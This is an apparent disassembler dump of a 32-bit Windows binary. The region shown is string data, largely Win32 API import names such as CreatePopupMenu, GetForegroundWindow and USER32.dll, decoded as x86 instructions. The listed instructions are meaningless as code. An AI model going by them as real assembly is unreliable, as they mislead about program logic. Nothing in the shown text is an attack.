  412a21:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412a25:	fs inc ebx
  412a27:	jne    0x412a9b
  412a29:	jae    0x412a9a
  412a2b:	jb     0x412a6e
  412a2d:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  412a34:	jae    0x412aa2
  412a36:	popa   
  412a37:	je     0x412a9e
  412a39:	inc    ecx
  412a3a:	arpl   WORD PTR [ebx+0x65],sp
  412a3d:	ins    BYTE PTR es:[edi],dx
  412a3e:	gs jb  0x412aa2
  412a41:	je     0x412ab2
  412a43:	jb     0x412a9c
  412a45:	add    BYTE PTR [ecx+0x0],ah
  412a48:	inc    ebx
  412a49:	jb     0x412ab0
  412a4b:	popa   
  412a4c:	je     0x412ab3
  412a4e:	push   eax
  412a4f:	outs   dx,DWORD PTR ds:[esi]
  412a50:	jo     0x412ac7
  412a52:	jo     0x412aa1
  412a54:	outs   dx,BYTE PTR gs:[esi]
  412a56:	jne    0x412a58
  412a58:	add    BYTE PTR ss:[ebx+0x68],al
  412a5c:	popa   
  412a5d:	jb     0x412ab4
  412a5f:	jo     0x412ad1
  412a61:	gs jb  0x412aa5
  412a64:	add    BYTE PTR [eax],al
  412a66:	mov    ds:0x57734901,al
  412a6b:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412a72:	imul   esp,DWORD PTR [ebx+0x6f],0x3b006564
  412a79:	add    DWORD PTR [edi+0x65],eax
  412a7c:	je     0x412acb
  412a7e:	gs jae 0x412af4
  412a81:	popa   
  412a82:	addr16 gs inc ebp
  412a85:	js     0x412afb
  412a87:	jb     0x412aea
  412a89:	dec    ecx
  412a8a:	outs   dx,BYTE PTR ds:[esi]
  412a8b:	outs   dx,WORD PTR ds:[esi]
  412a8d:	add    BYTE PTR [esi+0x0],al
  412a90:	inc    ebx
  412a91:	ins    BYTE PTR es:[edi],dx
  412a92:	outs   dx,DWORD PTR ds:[esi]
  412a93:	jae    0x412afa
  412a95:	inc    esp
  412a96:	gs jae 0x412b04
  412a99:	je     0x412b0a
  412a9b:	jo     0x412a9d
  412a9d:	add    cl,ch
  412a9f:	add    DWORD PTR [edi+0x70],ecx
  412aa2:	outs   dx,BYTE PTR gs:[esi]
  412aa4:	dec    ecx
  412aa5:	outs   dx,BYTE PTR ds:[esi]
  412aa6:	jo     0x412b1d
  412aa8:	je     0x412aee
  412aaa:	gs jae 0x412b18
  412aad:	je     0x412b1e
  412aaf:	jo     0x412ab1
  412ab1:	add    BYTE PTR [ebp+0x73795302],al
  412ab7:	je     0x412b1e
  412ab9:	ins    DWORD PTR es:[edi],dx
  412aba:	push   eax
  412abb:	popa   
  412abc:	jb     0x412b1f
  412abe:	ins    DWORD PTR es:[edi],dx
  412abf:	gs je  0x412b27
  412ac2:	jb     0x412b37
  412ac4:	dec    ecx
  412ac5:	outs   dx,BYTE PTR ds:[esi]
  412ac6:	outs   dx,WORD PTR ds:[esi]
  412ac8:	inc    ecx
  412ac9:	add    BYTE PTR [esi+0x2],cl
  412acc:	push   ebx
  412acd:	gs je  0x412b1d
  412ad0:	outs   dx,BYTE PTR gs:[esi]
  412ad2:	jne    0x412b1d
  412ad4:	je     0x412b3b
  412ad6:	ins    DWORD PTR es:[edi],dx
  412ad7:	dec    ecx
  412ad8:	outs   dx,BYTE PTR ds:[esi]
  412ad9:	outs   dx,WORD PTR ds:[esi]
  412adb:	push   edi
  412adc:	add    BYTE PTR [eax],al
  412ade:	adc    eax,0x6c655202
  412ae3:	gs popa 
  412ae5:	jae    0x412b4c
  412ae7:	inc    esp
  412ae8:	inc    ebx
  412ae9:	add    BYTE PTR [ecx+0x766e4901],cl
  412aef:	popa   
  412af0:	ins    BYTE PTR es:[edi],dx
  412af1:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412af9:	je     0x412afb
  412afb:	add    BYTE PTR [edx+eax*1+0x74697753],al
  412b02:	arpl   WORD PTR [eax+0x54],bp
  412b05:	outs   dx,DWORD PTR ds:[esi]
  412b06:	push   esp
  412b07:	push   0x69577369
  412b0c:	outs   dx,BYTE PTR ds:[esi]
  412b0d:	outs   dx,DWORD PTR fs:[esi]
  412b0f:	ja     0x412b11
  412b11:	add    BYTE PTR [esi+0x6c694b01],ah
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	push   esp
  412b19:	imul   ebp,DWORD PTR [ebp+0x65],0x2bd0072
  412b20:	imul   esp,DWORD PTR [ebp+0x79],0x62
  412b24:	fs pop edi
  412b26:	gs jbe 0x412b8e
  412b29:	outs   dx,BYTE PTR ds:[esi]
  412b2a:	je     0x412b2c
  412b2c:	cmp    eax,0x65684300
  412b31:	arpl   WORD PTR [ebx+0x52],bp
  412b34:	popa   
  412b35:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  412b3d:	outs   dx,BYTE PTR ds:[esi]
  412b3e:	add    BYTE PTR [eax],al
  412b40:	sahf   
  412b41:	add    DWORD PTR [ecx+0x73],ecx
  412b44:	push   edx
  412b45:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412b4a:	jo     0x412bc0
  412b4c:	jns    0x412b4e
  412b4e:	mov    es,WORD PTR [ecx]
  412b50:	dec    ecx
  412b51:	jae    0x412b96
  412b53:	push   0x6c417261
  412b58:	jo     0x412bc2
  412b5a:	popa   
  412b5b:	dec    esi
  412b5c:	jne    0x412bcb
  412b5e:	gs jb  0x412bca
  412b61:	arpl   WORD PTR [edi+0x0],dx
  412b64:	mov    ch,0x0
  412b66:	inc    esp
  412b67:	jb     0x412bca
  412b69:	ja     0x412bb8
  412b6b:	outs   dx,BYTE PTR gs:[esi]
  412b6d:	jne    0x412bb1
  412b6f:	popa   
  412b70:	jb     0x412b72
  412b72:	mov    BYTE PTR [edx],al
  412b74:	push   esp
  412b75:	popa   
  412b76:	bound  esp,QWORD PTR [edx+0x65]
  412b79:	fs push esp
  412b7b:	gs js  0x412bf2
  412b7e:	dec    edi
  412b7f:	jne    0x412bf5
  412b81:	push   edi
  412b82:	add    BYTE PTR [eax],al
  412b84:	or     eax,DWORD PTR [ecx]
  412b86:	inc    edi
  412b87:	gs je  0x412bce
  412b8a:	inc    ebx
  412b8b:	inc    ebp
  412b8c:	js     0x412b8e
  412b8e:	jno    0x412b92
  412b90:	push   ebx
  412b91:	gs je  0x412beb
  412b94:	imul   ebp,DWORD PTR [esi+0x64],0x6752776f
  412b9b:	outs   dx,BYTE PTR ds:[esi]
  412b9c:	add    BYTE PTR [eax],al
  412b9e:	xchg   ebx,eax
  412b9f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412ba3:	je     0x412c17
  412ba5:	outs   dx,DWORD PTR ds:[esi]
  412ba6:	jns    0x412be9
  412ba8:	arpl   WORD PTR [ebx+0x65],sp
  412bab:	ins    BYTE PTR es:[edi],dx
  412bac:	gs jb  0x412c10
  412baf:	je     0x412c20
  412bb1:	jb     0x412c07
  412bb3:	popa   
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	push   edi
  412bb9:	add    dl,BYTE PTR [ebx+0x65]
  412bbc:	je     0x412c0e
  412bbe:	jb     0x412c2f
  412bc0:	jo     0x412c19
  412bc2:	add    BYTE PTR [eax],al
  412bc4:	sti    
  412bc5:	add    DWORD PTR [eax+0x74],edx
  412bc8:	dec    ecx
  412bc9:	outs   dx,BYTE PTR ds:[esi]
  412bca:	push   edx
  412bcb:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412bd0:	push   0x74655302
  412bd5:	push   ebp
  412bd6:	jae    0x412c3d
  412bd8:	jb     0x412c29
  412bda:	bound  ebp,QWORD PTR [edx+0x65]
  412bdd:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  412be1:	outs   dx,WORD PTR ds:[esi]
  412be3:	jb     0x412c52
  412be5:	popa   
  412be6:	je     0x412c51
  412be8:	outs   dx,DWORD PTR ds:[esi]
  412be9:	outs   dx,BYTE PTR ds:[esi]
  412bea:	push   edi
  412beb:	add    dh,ch
  412bed:	add    DWORD PTR [eax+0x65],edx
  412bf0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412bf5:	jae    0x412c58
  412bf7:	addr16 gs inc ecx
  412bfa:	add    BYTE PTR [eax],al
  412bfc:	xor    eax,0x61684300
  412c01:	jb     0x412c57
  412c03:	outs   dx,DWORD PTR ds:[esi]
  412c04:	dec    edi
  412c05:	gs ins DWORD PTR es:[edi],dx
  412c07:	push   edi
  412c08:	add    BYTE PTR [eax],al
  412c0a:	add    BYTE PTR [ecx],0x49
  412c0d:	outs   dx,BYTE PTR ds:[esi]
  412c0e:	data16 ins BYTE PTR es:[edi],dx
  412c10:	popa   
  412c11:	je     0x412c78
  412c13:	push   edx
  412c14:	arpl   WORD PTR gs:[eax+eax*1-0x4d],si
  412c19:	add    BYTE PTR [edx+esi*2+0x61],al
  412c1d:	ja     0x412c68
  412c1f:	arpl   WORD PTR [edi+0x6e],bp
  412c22:	add    BYTE PTR [eax],al
  412c24:	mov    dl,0x0
  412c26:	inc    esp
  412c27:	jb     0x412c8a
  412c29:	ja     0x412c71
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	gs inc ebx
  412c30:	outs   dx,DWORD PTR ds:[esi]
  412c31:	outs   dx,BYTE PTR ds:[esi]
  412c32:	je     0x412ca6
  412c34:	outs   dx,DWORD PTR ds:[esi]
  412c35:	ins    BYTE PTR es:[edi],dx
  412c36:	add    BYTE PTR [eax],al
  412c38:	inc    edx
  412c39:	add    DWORD PTR [edi+0x65],eax
  412c3c:	je     0x412c8c
  412c3e:	gs js  0x412cb5
  412c41:	inc    esp
  412c42:	ins    BYTE PTR es:[edi],dx
  412c43:	addr16 inc edi
  412c45:	jb     0x412cb6
  412c47:	jne    0x412cb9
  412c49:	dec    ecx
  412c4a:	je     0x412cb1
  412c4c:	ins    DWORD PTR es:[edi],dx
  412c4d:	add    BYTE PTR ds:0x6e655302,ah
  412c53:	fs dec ecx
  412c55:	outs   dx,BYTE PTR ds:[esi]
  412c56:	jo     0x412ccd
  412c58:	je     0x412c5a
  412c5a:	mov    DWORD PTR [eax],eax
  412c5c:	inc    esp
  412c5d:	gs inc si
  412c60:	jb     0x412cc3
  412c62:	ins    DWORD PTR es:[edi],dx
  412c63:	gs push eax
  412c65:	jb     0x412cd6
  412c67:	arpl   WORD PTR [ecx+0x0],ax
  412c6a:	mov    es,WORD PTR [eax]
  412c6c:	inc    esp
  412c6d:	gs push di
  412c70:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  412c77:	outs   dx,DWORD PTR ds:[esi]
  412c78:	arpl   WORD PTR [ecx+0x0],ax
  412c7b:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  412c82:	outs   dx,DWORD PTR ds:[esi]
  412c83:	addr16 inc edx
  412c85:	outs   dx,DWORD PTR ds:[esi]
  412c86:	js     0x412cd8
  412c88:	popa   
  412c89:	jb     0x412cec
  412c8b:	ins    DWORD PTR es:[edi],dx
  412c8c:	inc    ecx
  412c8d:	add    BYTE PTR [edx],al
  412c8f:	add    dl,BYTE PTR [edx+0x65]
  412c92:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  412c9a:	popa   
  412c9b:	jae    0x412d10
  412c9d:	inc    ecx
  412c9e:	add    BYTE PTR [eax],al
  412ca0:	dec    edx
  412ca1:	add    BYTE PTR [ebx+0x6f],al
  412ca4:	jo     0x412d1f
  412ca6:	inc    ecx
  412ca7:	arpl   WORD PTR [ebx+0x65],sp
  412caa:	ins    BYTE PTR es:[edi],dx
  412cab:	gs jb  0x412d0f
  412cae:	je     0x412d1f
  412cb0:	jb     0x412d06
  412cb2:	popa   
  412cb3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cb7:	add    BYTE PTR [ebx+0x1],bl
  412cba:	inc    edi
  412cbb:	gs je  0x412d11
  412cbe:	jns    0x412d33
  412cc0:	je     0x412d27
  412cc2:	ins    DWORD PTR es:[edi],dx
  412cc3:	dec    ebp
  412cc4:	outs   dx,BYTE PTR gs:[esi]
  412cc6:	jne    0x412cc8
  412cc8:	mov    eax,0x61724400
  412ccd:	ja     0x412d22
  412ccf:	je     0x412d32
  412cd1:	je     0x412d38
  412cd3:	push   edi
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	loope  0x412cd8
  412cd8:	inc    esi
  412cd9:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412ce0:	outs   dx,DWORD PTR ds:[esi]
  412ce1:	ja     0x412d24
  412ce3:	add    BYTE PTR [edx+0x0],ah
  412ce6:	inc    ebx
  412ce7:	jb     0x412d4e
  412ce9:	popa   
  412cea:	je     0x412d51
  412cec:	push   edi
  412ced:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412cf4:	inc    ecx
  412cf5:	add    cl,al
  412cf7:	add    BYTE PTR [ebp+0x6e],al
  412cfa:	popa   
  412cfb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cff:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d06:	cmp    DWORD PTR [eax],eax
  412d08:	inc    ebx
  412d09:	push   0x70557261
  412d0e:	jo     0x412d75
  412d10:	jb     0x412d69
  412d12:	add    BYTE PTR [eax],al
  412d14:	or     al,BYTE PTR [edx]
  412d16:	push   edx
  412d17:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  412d20:	je     0x412d6d
  412d22:	gs jns 0x412d25
  412d25:	add    BYTE PTR [ebx],al
  412d27:	add    BYTE PTR [ecx+0x64],al
  412d2a:	push   0x75
  412d2c:	jae    0x412da2
  412d2e:	push   edi
  412d2f:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412d36:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412d3a:	add    BYTE PTR [eax],al
  412d3c:	aad    0x1
  412d3e:	dec    ebp
  412d3f:	gs jae 0x412db5
  412d42:	popa   
  412d43:	addr16 gs inc edx
  412d46:	outs   dx,DWORD PTR ds:[esi]
  412d47:	js     0x412da0
  412d49:	add    bh,cl
  412d4b:	add    DWORD PTR [ebp+0x65],ecx
  412d4e:	jae    0x412dc3
  412d50:	popa   
  412d51:	addr16 gs inc edx
  412d54:	outs   dx,DWORD PTR ds:[esi]
  412d55:	js     0x412d9c
  412d57:	js     0x412d9a
  412d59:	add    BYTE PTR [edx+0x1],ah
  412d5c:	inc    edi
  412d5d:	gs je  0x412db4
  412d60:	outs   dx,DWORD PTR ds:[esi]
  412d61:	jo     0x412dba
  412d63:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d6a:	dec    eax
  412d6b:	add    dl,BYTE PTR [ebx+0x65]
  412d6e:	je     0x412dbd
  412d70:	outs   dx,BYTE PTR gs:[esi]
  412d72:	jne    0x412d74
  412d74:	loop   0x412d76
  412d76:	inc    esi
  412d77:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412d7e:	outs   dx,DWORD PTR ds:[esi]
  412d7f:	ja     0x412dc6
  412d81:	js     0x412dc4
  412d83:	add    BYTE PTR [esi+0x616f4c01],dh
  412d89:	fs dec ebp
  412d8b:	outs   dx,BYTE PTR gs:[esi]
  412d8d:	jne    0x412dd0
  412d8f:	add    dh,cl
  412d91:	add    DWORD PTR [ebp+0x65],ecx
  412d94:	jae    0x412e09
  412d96:	popa   
  412d97:	addr16 gs inc edx
  412d9a:	outs   dx,DWORD PTR ds:[esi]
  412d9b:	js     0x412dde
  412d9d:	add    ch,bl
  412d9f:	add    BYTE PTR [ebp+0x71],al
  412da2:	jne    0x412e05
  412da4:	ins    BYTE PTR es:[edi],dx
  412da5:	push   edx
  412da6:	arpl   WORD PTR gs:[eax+eax*1-0x72],si
  412dab:	add    dl,BYTE PTR [edi+ebp*2+0x55]
  412daf:	outs   dx,BYTE PTR ds:[esi]
  412db0:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412db7:	add    BYTE PTR [edi+0x1],dh
  412dba:	inc    edi
  412dbb:	gs je  0x412e15
  412dbe:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  412dc5:	js     0x412e3b
  412dc7:	dec    esp
  412dc8:	outs   dx,BYTE PTR gs:[esi]
  412dca:	addr16 je 0x412e35
  412dcd:	push   edi
  412dce:	add    BYTE PTR [eax],al
  412dd0:	mov    al,BYTE PTR [edx]
  412dd2:	push   esp
  412dd3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  412ddb:	ja     0x412e50
  412ddd:	add    dh,bh
  412ddf:	add    BYTE PTR [edi+0x65],al
  412de2:	je     0x412e27
  412de4:	ins    BYTE PTR es:[edi],dx
  412de5:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412dec:	jb     0x412dee
  412dee:	les    eax,FWORD PTR [ecx]
  412df0:	dec    ebp
  412df1:	popa   
  412df2:	jo     0x412e38
  412df4:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  412dfb:	arpl   WORD PTR [eax+eax*1-0x45],si
  412dff:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412e03:	fs push ebx
  412e05:	je     0x412e79
  412e07:	imul   ebp,DWORD PTR [esi+0x67],0x17e0041
  412e0e:	dec    eax
  412e0f:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  412e17:	jne    0x412e62
  412e19:	je     0x412e80
  412e1b:	ins    DWORD PTR es:[edi],dx
  412e1c:	add    BYTE PTR [eax],al
  412e1e:	xor    al,BYTE PTR [ecx]
  412e20:	inc    edi
  412e21:	gs je  0x412e71
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	jne    0x412e71
  412e28:	je     0x412e8f
  412e2a:	ins    DWORD PTR es:[edi],dx
  412e2b:	inc    ebx
  412e2c:	outs   dx,DWORD PTR ds:[esi]
  412e2d:	jne    0x412e9d
  412e2f:	je     0x412e31
  412e31:	add    cl,al
  412e33:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  412e37:	imul   esi,DWORD PTR [ebp+0x70],0x49
  412e3b:	arpl   WORD PTR [edi+0x6e],bp
  412e3e:	dec    ecx
  412e3f:	fs inc esi
  412e41:	jb     0x412eb2
  412e43:	ins    DWORD PTR es:[edi],dx
  412e44:	inc    esp
  412e45:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  412e4c:	jns    0x412e4e
  412e4e:	mov    BYTE PTR [ecx],al
  412e50:	dec    ecx
  412e51:	outs   dx,BYTE PTR ds:[esi]
  412e52:	je     0x412eb9
  412e54:	jb     0x412ec9
  412e56:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  412e5b:	arpl   WORD PTR [eax+eax*1+0x13],si
  412e5f:	add    DWORD PTR [edi+0x65],eax
  412e62:	je     0x412ea8
  412e64:	outs   dx,DWORD PTR ds:[esi]
  412e65:	jne    0x412ec9
  412e67:	ins    BYTE PTR es:[edi],dx
  412e68:	gs inc ebx
  412e6a:	ins    BYTE PTR es:[edi],dx
  412e6b:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412e72:	add    BYTE PTR [eax],al
  412e74:	daa    
  412e75:	add    DWORD PTR [edi+0x65],eax
  412e78:	je     0x412ec5
  412e7a:	gs jns 0x412edf
  412e7d:	outs   dx,DWORD PTR ds:[esi]
  412e7e:	popa   
  412e7f:	jb     0x412ee5
  412e81:	push   esp
  412e82:	jns    0x412ef4
  412e84:	gs add al,dh
  412e87:	add    BYTE PTR [edi+0x65],al
  412e8a:	je     0x412ecd
  412e8c:	jae    0x412f07
  412e8e:	outs   dx,BYTE PTR ds:[esi]
  412e8f:	arpl   WORD PTR [ebx+0x65],cx
  412e92:	jns    0x412ee7
  412e94:	je     0x412ef7
  412e96:	je     0x412efd
  412e98:	add    BYTE PTR [eax],al
  412e9a:	sub    BYTE PTR [eax],al
  412e9c:	inc    ebx
  412e9d:	push   0x6f4c7261
  412ea2:	ja     0x412f09
  412ea4:	jb     0x412ee8
  412ea6:	jne    0x412f0e
  412ea8:	push   di
  412eaa:	add    BYTE PTR [eax],al
  412eac:	popf   
  412ead:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412eb1:	ins    BYTE PTR es:[edi],dx
  412eb2:	outs   dx,DWORD PTR ds:[esi]
  412eb3:	addr16 inc edx
  412eb5:	outs   dx,DWORD PTR ds:[esi]
  412eb6:	js     0x412f08
  412eb8:	popa   
  412eb9:	jb     0x412f1c
  412ebb:	ins    DWORD PTR es:[edi],dx
  412ebc:	push   edi
  412ebd:	add    BYTE PTR [ecx],ch
  412ebf:	add    BYTE PTR [ebx+0x68],al
  412ec2:	popa   
  412ec3:	jb     0x412f11
  412ec5:	outs   dx,DWORD PTR ds:[esi]
  412ec6:	ja     0x412f2d
  412ec8:	jb     0x412f21
  412eca:	add    BYTE PTR [eax],al
  412ecc:	and    al,0x0
  412ece:	inc    ebx
  412ecf:	push   0x65676e61
  412ed4:	dec    ebp
  412ed5:	outs   dx,BYTE PTR gs:[esi]
  412ed7:	jne    0x412f30
  412ed9:	add    BYTE PTR [edi+0x636f4c01],bh
  412edf:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412ee3:	outs   dx,DWORD PTR fs:[esi]
  412ee5:	ja     0x412f3c
  412ee7:	jo     0x412f4d
  412ee9:	popa   
  412eea:	je     0x412f51
  412eec:	add    BYTE PTR [eax],al
  412eee:	mov    al,ds:0x57734901
  412ef3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412efa:	mov    DWORD PTR [ecx],0x5670614d
  412f00:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  412f07:	gs jns 0x412f4f
  412f0a:	js     0x412f63
  412f0c:	add    BYTE PTR [eax],al
  412f0e:	pop    ecx
  412f0f:	add    dl,BYTE PTR [ebx+0x65]
  412f12:	je     0x412f66
  412f14:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412f19:	jo     0x412f8f
  412f1b:	jns    0x412f1d
  412f1d:	add    al,bh
  412f1f:	add    BYTE PTR [edi+0x65],al
  412f22:	je     0x412f67
  412f24:	ins    BYTE PTR es:[edi],dx
  412f25:	popa   
  412f26:	jae    0x412f9b
  412f28:	dec    esp
  412f29:	outs   dx,DWORD PTR ds:[esi]
  412f2a:	outs   dx,BYTE PTR ds:[esi]
  412f2b:	addr16 inc ecx
  412f2d:	add    cl,cl
  412f2f:	add    DWORD PTR [ebp+0x61],ecx
  412f32:	jo     0x412f8b
  412f34:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412f3b:	imul   ebp,DWORD PTR [esi+0x74],0x2930073
  412f42:	push   esp
  412f43:	jb     0x412fa6
  412f45:	outs   dx,BYTE PTR ds:[esi]
  412f46:	jae    0x412fb4
  412f48:	popa   
  412f49:	je     0x412fb0
  412f4b:	inc    ecx
  412f4c:	arpl   WORD PTR [ebx+0x65],sp
  412f4f:	ins    BYTE PTR es:[edi],dx
  412f50:	gs jb  0x412fb4
  412f53:	je     0x412fc4
  412f55:	jb     0x412f98
  412f57:	add    BYTE PTR [eax+eax*1],bh
  412f5a:	inc    ebx
  412f5b:	push   0x4d6b6365
  412f60:	outs   dx,BYTE PTR gs:[esi]
  412f62:	jne    0x412fb6
  412f64:	popa   
  412f65:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  412f6d:	add    BYTE PTR [edx+0x2],bl
  412f70:	push   ebx
  412f71:	gs je  0x412fc7
  412f74:	arpl   WORD PTR [edx+0x6f],si
  412f77:	ins    BYTE PTR es:[edi],dx
  412f78:	ins    BYTE PTR es:[edi],dx
  412f79:	dec    ecx
  412f7a:	outs   dx,BYTE PTR ds:[esi]
  412f7b:	outs   dx,WORD PTR ds:[esi]
  412f7d:	add    BYTE PTR ds:0x6c6c4100,al
  412f83:	outs   dx,DWORD PTR ds:[esi]
  412f84:	ja     0x412fd9
  412f86:	gs je  0x412fcf
  412f89:	outs   dx,DWORD PTR ds:[esi]
  412f8a:	jb     0x412ff1
  412f8c:	addr16 jb 0x412ffe
  412f8f:	jne    0x412fff
  412f91:	fs push edi
  412f93:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412f9a:	lahf   
  412f9b:	add    BYTE PTR [ecx+ebp*2+0x73],al
  412f9f:	jo     0x413002
  412fa1:	je     0x413006
  412fa3:	push   0x7373654d
  412fa8:	popa   
  412fa9:	addr16 gs inc ecx
  412fac:	add    BYTE PTR [eax],al
  412fae:	sub    eax,0x61684300
  412fb3:	jb     0x413003
  412fb5:	gs js  0x41302c
  412fb8:	push   edi
  412fb9:	add    bh,ah
  412fbb:	add    BYTE PTR [esi+0x72],al
  412fbe:	popa   
  412fbf:	ins    DWORD PTR es:[edi],dx
  412fc0:	gs push edx
  412fc2:	arpl   WORD PTR gs:[eax+eax*1-0x1c],si
  412fc7:	add    DWORD PTR [edi+0x66],ecx
  412fca:	data16 jae 0x413032
  412fcd:	je     0x413021
  412fcf:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412fd4:	mov    al,BYTE PTR [ecx]
  412fd6:	dec    ecx
  412fd7:	outs   dx,BYTE PTR ds:[esi]
  412fd8:	jbe    0x41303b
  412fda:	ins    BYTE PTR es:[edi],dx
  412fdb:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  412fe3:	add    BYTE PTR [edx+0x2],al
  412fe6:	push   ebx
  412fe7:	gs je  0x413030
  412fea:	outs   dx,DWORD PTR ds:[esi]
  412feb:	jb     0x413052
  412fed:	addr16 jb 0x41305f
  412ff0:	jne    0x413060
  412ff2:	fs push edi
  412ff4:	imul   ebp,DWORD PTR [esi+0x64],0x2f00776f
  412ffb:	add    dl,BYTE PTR [ebx+0x65]
  412ffe:	je     0x413041
  413000:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413004:	gs push edi
  413006:	imul   ebp,DWORD PTR [esi+0x64],0x9400776f
  41300d:	add    DWORD PTR [ecx+0x73],ecx
  413010:	inc    ebx
  413011:	push   0x646c69
  413016:	fwait
  413017:	add    dl,BYTE PTR [ebp+0x6e]
  41301a:	ins    BYTE PTR es:[edi],dx
  41301b:	outs   dx,DWORD PTR ds:[esi]
  41301c:	popa   
  41301d:	fs dec ebx
  41301f:	gs jns 0x413084
  413022:	outs   dx,DWORD PTR ds:[esi]
  413023:	popa   
  413024:	jb     0x41308a
  413026:	dec    esp
  413027:	popa   
  413028:	jns    0x413099
  41302a:	jne    0x4130a0
  41302c:	add    BYTE PTR [eax],al
  41302e:	pushf  
  41302f:	add    DWORD PTR [ecx+0x73],ecx
  413032:	dec    ecx
  413033:	arpl   WORD PTR [edi+0x6e],bp
  413036:	imul   esp,DWORD PTR [ebx+0x0],0x47013800
  41303d:	gs je  0x41308d
  413040:	outs   dx,BYTE PTR gs:[esi]
  413042:	jne    0x413097
  413044:	je     0x4130b8
  413046:	imul   ebp,DWORD PTR [esi+0x67],0xb9000041
  41304d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413051:	fs dec ebp
  413053:	outs   dx,BYTE PTR gs:[esi]
  413055:	jne    0x4130ae
  413057:	add    BYTE PTR [ebx],dl
  413059:	add    dl,BYTE PTR [edx+0x65]
  41305c:	imul   esi,DWORD PTR [bp+di+0x74],0x69577265
  413064:	outs   dx,BYTE PTR ds:[esi]
  413065:	outs   dx,DWORD PTR fs:[esi]
  413067:	ja     0x4130b6
  413069:	gs jae 0x4130df
  41306c:	popa   
  41306d:	addr16 gs push edi
  413070:	add    BYTE PTR [eax],al
  413072:	cmp    BYTE PTR [edx],al
  413074:	push   ebx
  413075:	gs je  0x4130bb
  413078:	jne    0x4130ec
  41307a:	jae    0x4130eb
  41307c:	jb     0x41307e
  41307e:	add    DWORD PTR ds:[edi+0x65],eax
  413082:	je     0x4130d1
  413084:	gs jae 0x4130fa
  413087:	popa   
  413088:	addr16 gs push edi
  41308b:	add    BYTE PTR ds:0x74654701,dl
  413091:	inc    esi
  413092:	outs   dx,DWORD PTR ds:[esi]
  413093:	jb     0x4130fa
  413095:	addr16 jb 0x413107
  413098:	jne    0x413108
  41309a:	fs push edi
  41309c:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  4130a3:	add    BYTE PTR [ebx+0x72],al
  4130a6:	gs popa 
  4130a8:	je     0x41310f
  4130aa:	inc    esp
  4130ab:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  4130b2:	jb     0x413115
  4130b4:	ins    DWORD PTR es:[edi],dx
  4130b5:	push   edi
  4130b6:	add    BYTE PTR [eax],al
  4130b8:	stc    
  4130b9:	add    BYTE PTR [edi+0x65],al
  4130bc:	je     0x413101
  4130be:	ins    BYTE PTR es:[edi],dx
  4130bf:	popa   
  4130c0:	jae    0x413135
  4130c2:	dec    esp
  4130c3:	outs   dx,DWORD PTR ds:[esi]
  4130c4:	outs   dx,BYTE PTR ds:[esi]
  4130c5:	addr16 push edi
  4130c7:	add    BYTE PTR [ebp+0x53],dl
  4130ca:	inc    ebp
  4130cb:	push   edx
  4130cc:	xor    esi,DWORD PTR [edx]
  4130ce:	cs fs ins BYTE PTR es:[edi],dx
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	add    BYTE PTR [eax],al
  4130d4:	mov    ah,0x3
  4130d6:	push   edx
  4130d7:	gs ins DWORD PTR es:[edi],dx
  4130d9:	outs   dx,DWORD PTR ds:[esi]
  4130da:	jbe    0x413141
  4130dc:	inc    esp
  4130dd:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4130e4:	jns    0x41313d
  4130e6:	add    BYTE PTR [eax],al
  4130e8:	add    al,0x3
  4130ea:	dec    esp
  4130eb:	gs popa 
  4130ed:	jbe    0x413154
  4130ef:	inc    ebx
  4130f0:	jb     0x41315b
